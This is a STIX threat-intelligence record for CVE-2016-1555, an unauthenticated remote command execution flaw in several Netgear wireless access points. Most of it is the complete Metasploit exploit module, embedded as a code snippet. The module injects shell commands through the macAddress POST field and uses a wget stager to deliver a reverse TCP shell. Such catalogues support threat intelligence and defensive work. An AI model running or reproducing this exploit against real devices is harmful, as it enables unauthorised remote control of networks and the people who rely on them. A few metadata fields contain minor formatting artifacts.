{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ea35144-c0dc-4f12-ac2b-9b79e6775009",
    "created": "2024-08-14T17:00:28.744618Z",
    "modified": "2024-08-14T17:00:28.744621Z",
    "name": "Netgear Devices Unauthenticated Remote Command Execution",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_unauth_exec.rb",
            "external_id": "netgear_unauth_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1555"
        },
        {
            "source_name": "reference",
            "url": "https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic"
        },
        {
            "source_name": "reference",
            "url": "http://seclists.org/fulldisclosure/2016/Feb/112"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Netgear Devices Unauthenticated Remote Command Execution',\n      'Description' => %q{\n        From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,\n        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in\n        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,\n        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute\n        arbitrary commands.\n      },\n      'Author'      =>\n        [\n          'Daming Dominic Chen <ddchen[at]cs.cmu.edu>', # Vuln discovery\n          'Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # MSF module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2016-1555'],\n          ['URL', 'https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic'],\n          ['PACKETSTORM', '135956'],\n          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/112']\n        ],\n      'DisclosureDate' => '2016-02-25', # According to http://seclists.org/fulldisclosure/2016/Feb/112\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_MIPSBE,\n      'Payload'        => {},\n      'DefaultOptions' => {\n        'CMDSTAGER::FLAVOR' => 'wget',\n        'PAYLOAD'           => 'linux/mipsbe/shell_reverse_tcp',\n        'WfsDelay'          => 10 },\n      'Targets'        => [['Automatic', { }]],\n      'CmdStagerFlavor'=> %w{ echo printf wget },\n      'DefaultTarget'  => 0\n      ))\n      register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Path of the vulnerable URI.', '/boardDataWW.php']), # boardDataWW.php\n        OptString.new('MAC_ADDRESS', [true, 'MAC address to use (default: random)', Rex::Text.rand_text_hex(12)])\n      ])\n  end\n\n  # check for vulnerability existence\n  def check\n    fingerprint = Rex::Text.rand_text_alpha(12) # If vulnerability is present, we will get this back in the response\n    res = execute_command(\"echo #{fingerprint}\") # the raw POST response\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe\n    end\n\n    unless res.get_html_document.at('input').to_s.include? fingerprint\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  # execute a command, or simply send a POST request\n  def execute_command(cmd, opts = {})\n    vars_post = {\n      'macAddress' => \"#{datastore['MAC_ADDRESS']};#{cmd};\",\n      'reginfo' => '1',\n      'writeData' => 'Submit'\n    }\n\n    send_request_cgi({\n      'method'  => 'POST',\n      'headers' => { 'Connection' => 'Keep-Alive' },\n      'uri'     => normalize_uri(target_uri.path),\n      'vars_post' => vars_post\n    })\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the target!\")\n  end\n\n  # the exploit method\n  def exploit\n    #run a check before attempting to exploit\n    unless [CheckCode::Vulnerable].include? check\n      fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'\n    end\n\n    execute_cmdstager(linemax: 2048) # maximum 130,000\n  end\n\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-02-25, # According to http://seclists.org/fulldisclosure/2016/Feb/112",
    "x_mitre_platforms": [
        "linux'"
    ]
}